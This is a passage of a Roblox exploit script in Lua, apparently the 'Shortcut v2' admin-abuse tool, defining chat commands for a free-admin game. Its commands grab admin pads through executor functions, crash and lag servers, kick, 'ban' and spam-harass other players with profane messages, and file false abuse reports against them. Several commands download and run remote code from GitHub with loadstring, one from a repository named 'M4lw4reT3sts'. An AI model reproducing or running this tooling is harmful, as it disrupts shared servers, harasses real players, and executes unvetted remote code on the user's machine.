		sg:SetCoreGuiEnabled("PlayerList", true)
		PlayerList:Destroy()
	end

	task.spawn(function()
		while scriptrunning do task.wait()
			coroutine.wrap(function() -- PadAbuse
				if padAbuse == true then
					local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
					for i, pad in pairs(pads) do
						coroutine.wrap(function()
							pcall(function()
								local cre = pad.Head
								local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
								firetouchinterest(cre, spr, 1)
								firetouchinterest(cre, spr, 0)
								firetouchinterest(cre, spr, 1)
								task.wait()
								firetouchinterest(cre, spr, 0)

								if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
									fireclickdetector(adminFlr.Regen.ClickDetector, 0)
								end
							end)
						end)()
					end
				end
			end)()

			coroutine.wrap(function() -- Perm
				local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
				if perm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
				else
					pcall(function()
						local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
						local a = pad.Head
						firetouchinterest(a, spr, 1)
						firetouchinterest(a, spr, 0)
						firetouchinterest(a, spr, 1)
						task.wait()
						firetouchinterest(a, spr, 0)
					end)
				end
			end)()
		end
	end)

	--// Gamepass checker \\--


	connections[#connections + 1] = mousee.Button1Down:Connect(function()
		pcall(function()
			local plr = mousee.Target.Parent.Parent
			for i,v in pairs(game.Players:GetPlayers()) do
				pcall(function()
					if mousee.Target.Parent:FindFirstChild("Humanoid") then
						plr = mousee.Target.Parent
					end
				end)
			end
			if plr ~= nil then
				if clickExplode then
					chatt("explode "..plr.Name)
				elseif clickAnnoy then
					chatt(prefix3.."annoy "..plr.Name)
				elseif clickFard then
					for i = 1, 128 do
						chatt("smoke "..plr.Name.." "..plr.Name.." "..plr.Name)
					end
					wait(2.5)
					chatt("kill "..plr.Name)
					chatt("h \n\n\n\n\n\n LOL "..plr.Name.." DIED BY THEIR OWN STENCH \n\n\n\n\n\n")
				end
			end
		end)
	end)

	task.spawn(function()
		if nores1 then 
			nores2 = true
			return
		end
		nores1 = true
		nores2 = true
		local Players = game:GetService("Players")
		local LocalPlayer = Players.LocalPlayer

		local RESPAWN_THRESHOLD = 5

		local respawnCount = 0
		local lastRespawnCount = 0
		local lastRespawnCheck = time()

		local function checkRespawnRate()
			local currentTime = time()
			if (currentTime - lastRespawnCheck) >= 1 then
				local respawnRate = respawnCount - lastRespawnCount
				if respawnRate > RESPAWN_THRESHOLD then
					if messagewentpast2 then return end
					messagewentpast2 = true
					logn("Use //forcelag if you're being spam respawned or refreshed")
					wait(30)
					messagewentpast2 = false
				end
				lastRespawnCount = respawnCount
				lastRespawnCheck = currentTime
			end
		end

		connections[#connections + 1] = game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			respawnCount = respawnCount + 1
		end)

		connections[#connections + 1] = game:GetService("RunService").RenderStepped:Connect(function()
			task.spawn(function()
				if nores2 then
					checkRespawnRate()
				end
			end)
		end)
	end)

	_G.prefix3 = "//"
	local admin = {prefix3 = prefix3, version = "v2"}
	local commands = {}
	local descriptions = {}
	function addcommand(cmdName, cmdDescription, cmdFunction)
		commands[cmdName] = cmdName
		descriptions[cmdName] = cmdDescription
		connections[#connections + 1] = plr.Chatted:Connect(function(msg)
			msg = msg:lower()
			args = msg:split(" ")
			if args[1] == admin.prefix3 .. cmdName then
				cmdFunction()
			elseif args[1] == "/e" and args[2] == admin.prefix3 .. cmdName then
				args[2] = args[3]
				cmdFunction()
			end
		end)
	end

	function GetPlayer(target)
		local plrs = game:service("Players"):GetPlayers()
		if target:lower() == "all" then
			return plrs
		elseif target:lower() == "others" then
			for index, plr in pairs(plrs) do
				if plr == game:service("Players").LocalPlayer then
					table.remove(plrs, index)
					return plrs
				end
			end
		elseif target:lower() == "me" then
			return {game:service("Players").LocalPlayer}
		else
			local plrTargets = {}
			for index, plr in pairs(plrs) do
				if plr.Name:sub(1, #target):lower() == target:lower() or plr.DisplayName:sub(1, #target):lower() == target:lower()  then
					table.insert(plrTargets, plr)
				end
			end
			return plrTargets
		end
	end

	addcommand("migrate",
		"No description",
		function()
			while scriptrunning do wait(.35)
				task.spawn(function()
					local x = {}
					local amount = 1 or 2
					for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
						if type(v) == "table" and v.playing == 1 or v.playing == 2  and v.id ~= game.JobId then
							x[#x + 1] = v.id
							amount = 1 or 2
						end
					end
					if #x > 0 then
						logn("Joining a server with "..amount.." Players")
						wait(0.25)
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
					else
						if messagewentpast then return end
						messagewentpast = true
						logn("Waiting...")
						logn("Waiting...")
						logn("Unable to immediately join just yet. Waiting...")
					end
				end)
			end
		end)

	addcommand("permap", -- Perm Anti Punish
		"No description",
		function()
			permap = true
			coroutine.wrap(function()
				while permap and scriptrunning do
					task.wait(.0095)
					if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
						chatt("unpunish me " .. math.random(1, 1000))
						task.wait(.35)
						chatt("unpunish me " .. math.random(1, 1000))
					end
				end
			end)()
		end)

	addcommand("nonpermap", -- Non-perm Anti Punish
		"No description",
		function()
			local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
			_G.nonpermantipunish = true

			coroutine.wrap(function()
				while nonpermantipunish do task.wait()
					if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
						if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
							queueteleport([[
repeat task.wait() until game:IsLoaded()

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin
local padAbuse = true
local perm = true
local loopres = true
local lc = {}

local mousee = game.Players.LocalPlayer:GetMouse()
local unloop_keybind = "x"

mousee.KeyDown:connect(function(key)
    if key:lower() == unloop_keybind then
        padAbuse = false
        loopres = false
        for _, connection in ipairs(lc) do
            connection:Disconnect()
        end
    end
end)

task.spawn(function()
while task.wait() do
coroutine.wrap(function()
    if padAbuse == true then
        local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
        for i, pad in pairs(pads) do
            coroutine.wrap(function()
                pcall(function()
                    local cre = pad.Head
                    local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                    firetouchinterest(cre, spr, 1)
                    firetouchinterest(cre, spr, 0)
                    firetouchinterest(cre, spr, 1)
                    task.wait()
                    firetouchinterest(cre, spr, 0)
                    
                    if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                        fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                    end
                end)
            end)()
        end
    end
end)()

coroutine.wrap(function() -- Perm
    local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
    if perm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
    else
        pcall(function()
            local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
            local a = pad.Head
            firetouchinterest(a, spr, 1)
            firetouchinterest(a, spr, 0)
            firetouchinterest(a, spr, 1)
            task.wait()
            firetouchinterest(a, spr, 0)
        end)
    end
end)()
end
end)

task.wait()

function chat(plr)
    local connection = plr.Chatted:Connect(function(msg)
        if msg:lower():find("punish") or msg:lower():find("########") then
            if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
                game:GetService("Players").LocalPlayer.Character.Head:Destroy()
            end
        end
    end)
    table.insert(lc, connection)
end

for _, v in ipairs(game.Players:GetPlayers()) do
    chat(v)
end

game.Players.PlayerAdded:Connect(function(plr)
    chat(plr)
end)

local function dumbrobloxupdate(character)
    while loopres do
        pcall(function()
            local humanoid = character:WaitForChild("Humanoid")
            pcall(function()
                game:GetService("Players").LocalPlayer.Character.Head:Destroy()
            end)
            task.wait()
            pcall(function()
                game:GetService("Players").LocalPlayer.Character.Head:Destroy()
            end)
            chatt(":punish                                                                                                                                others fuck "..math.random(1,1000))
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -499.4, 0))
            task.wait()
        end)
    end
end

lc[#lc+1] = game.Players.LocalPlayer.CharacterAdded:Connect(dumbrobloxupdate)
game:GetService("Players").LocalPlayer.Character.Head:Destroy()
]])
							game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
						else
							chatt("unpunish me")
							chatt("punish others")
						end
					end
				end
			end)()
		end)

	addcommand("annoy",
		"No description",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				spam = true
				while spam do Utils.Task:wait()
					chatt("unchar "..Target.Name.." "..Target.Name.." "..Target.Name)
				end
			end
		end)

	addcommand("punish",
		"No description",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				if noalteredp then 
					logn("The altered punish has been disabled")
					return
				end
				chatt("unpunish "..Target.Name.." "..math.random(1,1000));task.wait()
				chatt("invis "..Target.Name.." "..math.random(1,1000))
				chatt(":refresh "..Target.Name.." "..math.random(1,1000))
				chatt("invis "..Target.Name.." "..math.random(1,1000))
				chatt(":kill "..Target.Name.." "..math.random(1,1000))
				chatt("invis "..Target.Name.." "..math.random(1,1000))
				chatt(":trip "..Target.Name.." "..math.random(1,1000))
				chatt("invis "..Target.Name.." "..math.random(1,1000))
				chatt("speed "..Target.Name.." 00000000000000000000000000000000000000000000")
				chatt(":setgrav "..Target.Name.." -1000000000000000000000000000000000000000000000000000000000000000000000000000000000000");wait(.1)
				chatt("speed "..Target.Name.." 00000000000000000000000000000000000000000000")
				chatt("invis "..Target.Name.." "..Target.Name..""..Target.Name.." "..math.random(1,1000))
				chatt(":unpunish "..Target.Name.." "..Target.Name.." "..Target.Name.." "..math.random(1,1000));task.wait(.2)
				chatt("invis "..Target.Name.." "..math.random(1,1000));wait(.2)
				chatt(":reset "..Target.Name.." "..math.random(1,1000));wait(.15)
				pcall(function()
					fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
					chatt("iyc firecd")
				end)
				for i = 1, 20 do
					chatt(":punish "..Target.Name.."                                                                                                 "..Target.Name.." "..Target.Name.."                                                                       "..math.random(1,1000))
				end
				chatt("speed "..Target.Name.." 00000000000000000000000000000000000000000000")
				wait(1)
				chatt("invis                                                                                                                                                 "..Target.Name.." "..math.random(1,1000));wait(.2)
				chatt("removehats                                                                                                                                                 "..Target.Name.." "..math.random(1,1000));wait(.2)
			end
		end)

	addcommand("permcheck",
		"No description",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				local id1 = 66254
				local id2 = 64354
				task.wait()
				if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. Target.UserId .. "/items/GamePass/" .. id1), id1) then
					permcheck1 = true
					logn(Target.Name..' has perm in NBC')
					permcheck1 = true
					task.spawn(function()
						wait(1.35)
						permcheck1 = false
					end)
				end
				if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. Target.UserId .. "/items/GamePass/" .. id2), id2) then
					logn(Target.Name..' has perm in BC')
					chatt("punish "..Target.Name);wait(4.65)
					bcbought = true
					local file = "fuck and cum"
					local a = {}

					for letter in file:gmatch(".") do
						if letter ~= "\r" and letter ~= "\n" then
							table.insert(a, letter)
						end
					end

					for i, v in ipairs(a) do
						print(i, v)
					end

					for b, c in ipairs(a) do
						local d = "variable_" .. tostring(b)
						_G[d] = c
					end
					for b, c in ipairs(a) do
						local e = string.rep("  ", 2 * (b - 1))
						chatt("h/ lol look\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
					end
				else 
					if permcheck1 == true then return end
					logn(Target.Name..' does not have Perm')
				end
			end
		end)

	addcommand("profilepos",
		"No description",
		function()
			if not syn then
				dofile("regprofile.lua")
			else
				logn('Execute the file manually from your workspace folder or use SW')
				logn('This function does not exist on Synapse.')
				pcall(function()
					dofile("regprofile.lua")
				end)
			end
		end)

	addcommand("regenprofile",
		"No description",
		function()
			local FileName = "regprofile.lua"
			if writefile and readfile then
				local ExistingFile = pcall(readfile, FileName)
				if not ExistingFile then
					-- pass
				else
					notify('r', 'Teleporting you to your profile coords instead')
					chatt(prefix3.."profilepos")
					return notify('r', 'Regen profile has already been created')
				end
			end
			local part = game:GetService("Workspace").Terrain["_Game"].Admin.Regen
			shared.regencoords = part.Position
			local line = 'game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(' .. shared.regencoords.X .. ', ' .. shared.regencoords.Y .. ', ' .. shared.regencoords.Z .. ') -- Those are your personalized coords. Delete this file if you want to generate new coords'
			writefile("regprofile.lua", line)
			if not syn then
				dofile("regprofile.lua")
			else
				logn('Execute the file manually from your workspace folder or use SW')
				logn('This function has been disabled on Synapse.')
				pcall(function()
					dofile("regprofile.lua")
				end)
			end
		end)

	addcommand("deleteregen",
		"No description",
		function()
			chatt("gear me "..antilog.."108158379");task.wait()
			local function L_1_func()
				repeat task.wait()
				until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
			end
			local function L_2_func()
				repeat task.wait()
				until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
				spawn(function()
					while scriptrunning do
						game:GetService('RunService').Heartbeat:wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						L_13_.CFrame = L_12_.Regen.CFrame * CFrame.new(-1 * (L_12_.Regen.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);task.wait()
						if not L_14_ then
							break
						end
					end
				end)
				spawn(function()
					while L_14_ do task.wait(nil)
						chatt("unpunish me "..math.random(1,1000))
					end
				end);task.wait(0.3)
				L_14_ = false
			end
			local L_3_ = math.random(1, 2)
			task.spawn(function()
				local FileName = "regprofile.lua"
				if writefile and readfile then
					local ExistingFile = pcall(readfile, FileName)
					if not ExistingFile then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(math.random(-37876, 853406), math.random(-37876, 42407), math.random(-37876, 4359)))
					else
						chatt(prefix3.."profilepos")
					end
				end
			end)
			wait(.35)
			chatt("setgrav me -550");task.wait()
			chatt("gear me 00000000000000000000000000000108158379")
			L_1_func();task.wait(.35)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			local L_4_ = {
				[1] = Enum.KeyCode.E
			}

			game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));task.wait()
			repeat task.wait()
			until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");task.wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			chatt("unfly me");task.wait(.2)
			repeat
				L_2_func()

			until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");task.wait()

			local L_5_ = {
				[1] = Enum.KeyCode.E
			}

			game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
			repeat task.wait()
			until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")

			chatt("respawn me")
			L_1_func();task.wait(.35)
			local L_6_ = {
				[1] = Enum.KeyCode.E
			}

			game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
			repeat task.wait()
			until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");task.wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
			for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
				if L_16_forvar1.Name == "FakeCharacter" then
					L_16_forvar1:Destroy()
				end
			end
		end)

	addcommand("nopadgrabber",
		"No description",
		function()
			perm = false
		end)

	addcommand("unantikill",
		"No description",
		function()
			ELFRGD = false
			logn("AntiKill is now Off")
		end)

	addcommand("breakcam",
		"No description",
		function()
			chatt("gear me "..antilog.."4842204072");wait(.35)
			chatt("gear me "..antilog.."4842218829");wait(.35)
			chatt("gear me "..antilog.."4842190633");wait(.35)
			chatt("gear me "..antilog.."4842207161");wait(.35)
			chatt("gear me "..antilog.."4842215723");wait(.35)
			chatt("gear me "..antilog.."4842212980");wait(.35)
			chatt("gear me "..antilog.."4842197274");wait(.35)
			chatt("gear me "..antilog.."4842186817");wait(.35)
			chatt("gear me "..antilog.."4842201032")
		end)

	addcommand("sunset",
		"No description",
		function()
			chatt("colorshifttop 600 400 10")
			chatt("colorshiftbottom 600 400 10")
			chatt("time 16")
		end)

	addcommand("fixclientcam",
		"No description",
		function()
			task.spawn(function()
				local lp = game.Players.LocalPlayer
				local ui = game:GetService("UserInputService")
				local l__ContextActionService__7 = game:GetService("ContextActionService");
				local l__RunService__1 = game:GetService('RunService')
				l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
				l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
				l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
				while true do
					repeat game:GetService'RunService'.Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
					l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
					l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
					l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
					local wepsys = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
					if not wepsys then return end
					for i,v in pairs(wepsys:GetDescendants()) do
						if v:IsA("Script") then
							v.Disabled = true
						end
						v:Destroy()
					end
					local wep = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
					local gui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
					local sc = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
					if wep then wep.Disabled = true wep:Destroy() end
					if gui then gui:Destroy() end
					if sc then
						sc.Disabled = true
						sc:Destroy()
					end
					ui.MouseIconEnabled = true
					game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
					game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
					lp.Character.Humanoid.AutoRotate = true
				end
			end)
		end)

	addcommand("periastron",
		"No description",
		function()
			chatt("gear me "..antilog.."159229806");wait(1.5)
			chatt("gear me "..antilog.."233520257")
			chatt("gear me "..antilog.."120307951");wait(2.5)
			chatt("gear me "..antilog.."80661504")
			chatt("gear me "..antilog.."93136802");wait(.35)
			chatt("gear me "..antilog.."99119240")
			chatt("gear me "..antilog.."73829193");wait(.65)
			chatt("gear me "..antilog.."139577901")
			chatt("gear me "..antilog.."2544549379");wait(3)
		end)

	addcommand("tempcrash",
		"No description",
		function()
			chatt("god all")
			chatt("gear me 92628079");wait(.35)
			for i,v in pairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
				if v:IsA("Tool") or v:IsA("HopperBin") then
					v.Parent = game.Players.LocalPlayer.Character
				end
			end
			wait(.35)
			local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
			for _, v in ipairs(Backpack:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Character
				v:Activate()
			end
			wait(.35)
			local VirtualUser = game:GetService("VirtualUser")
			VirtualUser:CaptureController()
			VirtualUser:ClickButton1(Vector2.new())
			wait(.39)
			for i = 1, 5 do
				chatt("unsize me me me "..math.random(1,1000))
			end
			wait(1)
			finished = true
			task.spawn(function()
				wait(2.5)
				game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
				wait(5)
				finished = false
				chatt("ungear me")
			end)
			task.spawn(function()			
				local StatsService = game:GetService("Stats")
				local ping1 = string.split(StatsService.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
				task.wait(.4)
				while finished do task.wait(.2)
					local ping2 = string.split(StatsService.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
					if ping2 ~= ping1 then
						if ratelimit3 then return end
						ratelimit3 = true
						for i = 1, 5 do
							if not finished then return end
							chatt("unsize me me me "..math.random(1,1000))
						end
						wait(2.51)
						ratelimit3 = false
						--finished = false
					end
				end
			end)
		end)

	addcommand("ivory",
		"No description",
		function()
			chatt("gear me "..antilog.."108158379")
		end)

	addcommand("crazycolors",
		"No description",
		function()
			chatt("fogend nil")
			colors = true
		end)

	addcommand("fixpaint",
		"No description",
		function()
			loadstring(game:HttpGet(("https://raw.githubusercontent.com/Qltxi/scripts/main/Color%20API%202.0"),true))()
		end)

	addcommand("messpaint",
		"No description",
		function()
			chatt("gear me "..antilog.."18474459")
			wait(1)
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
			wait(0.25)
			for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
				task.spawn(function()
					if v:IsA("Part") then
						local Partse =
							{
								["Part"] = v,
								["Color"] = Color3.new(math.random(0, 255), math.random(0, 255), math.random(0, 255))
							}
						game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
					end
				end)
			end
		end)

	addcommand("noplayerlist",
		"No description",
		function()
			Utils.ejectGUI()
		end)

	addcommand("forcelag",
		"No description",
		function()
			trueblind()
			wait(.49)
			for i = 1, 350 do
				chatt("unchar all all all")
			end
			wait(5.01)
			for i = 1, 350 do
				chatt(":gear all 253519495")
			end
			while task.wait() do
				chatt(":gear all 253519495")
			end
		end)

	addcommand("unloopgrab",
		"No description",
		function()
			padAbuse = false
		end)

	addcommand("loopgrab",
		"No description",
		function()
			padAbuse = true
		end)

	addcommand("antikill",
		"No description",
		function()
			ELFRGD = true
			chatt(prefix3.."nok")
			if ELFRGD == true then
				if KGODglobal == true then
					return
				end
				pcall(function()
					_G.KGODglobal = true
				end)
				connections[#connections + 1] = game.Players.LocalPlayer.CharacterAdded:connect(function()
					task.wait(.65)
					chatt("god                                                                                                                               me fuck " .. math.random(1, 1000))
				end)
				logn("AntiKill is now On")
			end
		end)

	addcommand("nok",
		"No description",
		function()
			pcall(function()
				local objs = game:GetService("Workspace").Terrain._Game.Workspace.Obby:GetChildren()
				for i, obj in pairs(objs) do
					coroutine.wrap(function()
						pcall(function()
							obj.TouchInterest:Destroy()
						end)
					end)()
				end
			end)
		end)

	addcommand("antigear",
		"No description",
		function()
			antiGear = true
		end)

	addcommand("unantigear",
		"No description",
		function()
			antiGear = false
		end)


	addcommand("toregen",
		"No description",
		function()
			loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/FindVerticalRegen"), true))()
		end)

	addcommand("kick",
		"Kick a player",
		function()
			-- This kick is nerfed. Var has way better kicks
			local playercount = game.Players:GetPlayers()
			if #playercount == 2 then
				trueblind()
				chatt("skydive                                                                                                                                  me me me")
				chatt("skydive                                                                                                                                  me me me")
				chatt("skydive                                                                                                                                  me me me");wait(.51)
				chatt(prefix3.."vgcrash");wait(.51)
				chatt(prefix3.."migrate")
				return 
			end
			if #playercount == 3 then
				logn("Not enough players")
				return
			end
			trueblind()
			for i = 1, 128 do
				chatt("dog                                                                                                          others others others fuck "..math.random(1,1000))
			end;task.wait(.39)
			for i = 1, 128 do
				chatt("dog                                                                                                          others others others fuck "..math.random(1,1000))
			end;task.wait(.39)
			for i = 1, 90 do
				chatt("dog                                                                                                          others others others fuck "..math.random(1,1000))
			end;task.wait(.56)
			chatt("tp                                                                                                          others others");wait(.49)
			chatt("tp "..Target.Name.." others");wait(.51)
			chatt("tp "..Target.Name.." others");wait(.51)
			chatt("tp "..Target.Name.." others")
			chatt("sit "..player);wait(.51)
			chatt("kill "..Target.Name.." "..math.random(1,1000));wait(2.5)
			chatt("respawn others");wait()
			pcall(function()
				execCmd("nofog")
				execCmd("day")
				execCmd("brightness 1")
			end)
			chatt("unblind                                                                                    me")
			chatt("jump others")
		end
	)

	addcommand("cmds",
		"Commands list",
		function()
			logn("Then scroll down as a slider will appear")
			logn("Open the console with F9")
			print([[
Your prefix is "//"
Usage/example: //spam explode random
or //sunset
etc






cmds
mboombox (string) - Boombox script, requires boombox to already be in your inventory
spam (command)
annoy (player) - Spam respawn a player
stop - stop spamming 
toregen - Teleport to the regen pad
vgcrash - Crash the server using the vampire gear
silcrash - (REQUIRES PERSON299'S ADMIN) Silently crash the server. Keep in mind that SCV3-Var has a way better silcrash
fixpaint - Restore the map colors to how it originally was (we were the first to have this fully fixed with credit to siyamicik and boomanoid)
messpaint - Mess up the map paint instead by painting everything random
breakcam - Break the server camera
fixclientcam - This will only fix YOUR CAMERA. For anyone else it will stay broken
migrate - Look for an empty/clean server and join it. There's no ping check though so if that server is located on the other side of the world then that sucks for you lmao
sunset - Sets the map theme to this.
periastron - This gives you all periastron swords EXCEPT FOR THE IVORY
ivory - This will give you the ivory specifically. It has been separated due to the ivory having many uses outside of just being an ordinary periastron sword, an example of that is attaching and moving parts or objects by using the Ivory's server sided after making your character weld to a part
tempcrash - Temporarily crash the server
iy - Load up Infinite Yield.
crazycolors - This will hurt peoples eyes. Use the stop command to stop it
nopadgrabber - Disable the padgrabber that will automatically get a pad if your account doesn't have perm
permcheck (player) - Check if a player has perm
punish (Player) - Altered punish, it's buffed and can only be bypassed using respawn or unchar
forcelag - Use this command in emergencies. To stop it, you have to rejoin entirely (Requires admin of course)
tempcrash - Temporarily crash the server using the blue tempcrash sword
kick (Player) - Kick a player using the shitty dog method (scv3-var has a way better method)

classicmode - Run old SCV2 instead. This script is very outdated and poorly put together and also very memory heavy, but some people still like it because it more commands (no wonder). Keep in mind that old v2 is over a year old by now

Since some features are still missing, I may recommend you to use classic SCV2 as the script itself isn't bad, it's just the coding that's bad and it's very heavy unlike this remake (the remake also loads instantly lmao)




Shortcut v2, mostly scripted by Tech
with help from

Yeemi - Made most of base SCV2 and some of it has been re-used in the remake
Miia - Made some of base SCV2 and owns the project
Jotunn - Made the command handler
Vecko - Additional code
Whatjg - Additional code
Quiving - Additional code
Shade4Real - Additional code

This project is still alive and well as of 6/9/2023 so you can contribute as well, and your name will appear in the credits]])
		end)

	addcommand("silcrash", -- You don't want to immediately leave after doing this, or else the crash will be temp
		"Silent crash",
		function()
			_G.nonpermantipunish = false
			for i = 1, 40 do
				chatt(":punish/                                                                                                                                       me fuck")
				wait(.51)
				chatt("h/ \n\n\n\n\n\n Slight change of plan. The server has closed, no more playing here \n\n\n\n\n\n")
				for i = 1, 128 do
					--task.wait()
					chatt(
						"rocket/                                                                                                                                       me me me fuck"
					)
				end

				--task.wait(.5)

				for i = 1, 500 do
					task.wait()
					chatt(
						"unpunish/                                                                                                                                     me me me fuck"
					)
				end
				wait(1)
				chatt("clone me me me")
				task.spawn(function()
					if alreadyspammed then return end
					alreadyspammed = true
					for i = 1, 350 do
						chatt("respawn/                                                                                                                                       others others others fuck")
					end
				end)
				wait(.49)
				for i = 1, 128 do
					task.wait()
					chatt(
						"rocket/                                                                                                                                       all all all fuck"
					)
				end

				for i = 1, 128 do
					task.wait()
					chatt(
						"shield/                                                                                                                                       all all all fuck"
					)
				end

				--task.wait(.5)

				for i = 1, 500 do
					task.wait()
					chatt(
						"unpunish/                                                                                                                                     all all all fuck"
					)
				end
				chatt("clone all all all")
			end
		end)

	addcommand("ban",
		"Ban a player",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				local id1 = 66254
				task.wait()
				if not game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen") then
					chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Failed to ban "..Target.Name.." \n Try a different method instead")
					game.Players:ReportAbuse(game:GetService("Players"),Target.Name,"Cheating/Exploiting", "Using a spam script to disrupt the chat for everyone")
					return
				end
				if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. Target.UserId .. "/items/GamePass/" .. id1), id1) then
					local playercount = game.Players:GetPlayers()
					if #playercount == 2 then
						if watermark then
							game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(watermarkmsg.." "..banwatermark.." "..Target.Name,"all")
						end
						trueblind()
						chatt("skydive                                                                                                                                  me me me")
						chatt("skydive                                                                                                                                  me me me")
						chatt("skydive                                                                                                                                  me me me");wait(.51)
						chatt(prefix3.."vgcrash");wait(.51)
						chatt(prefix3.."migrate")
						return 
					end
					chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Failed to ban "..Target.Name.." \n Try a different method instead")
					print('Perm', Target.Name..' has perm in NBC')
					game.Players:ReportAbuse(game:GetService("Players"),Target.Name,"Cheating/Exploiting", "Spamming in the chat")
					return
				else
					if not banscript1 then
						noalteredp = true
						shared.sillock = {}
						shared.gravlock = {}
						banscript1 = true
						loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/my-own-scripts-projects/main/APIPART2.lua'),true))()
						wait()
						chatt("-lock "..Target.Name)
					else
						chatt("-lock "..Target.Name)
					end
				end
			end
		end)

	addcommand("vgcrash",
		"Crash the server with the vampire gear",
		function()
			chatt(":gear me "..antilog.."94794847")
			local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
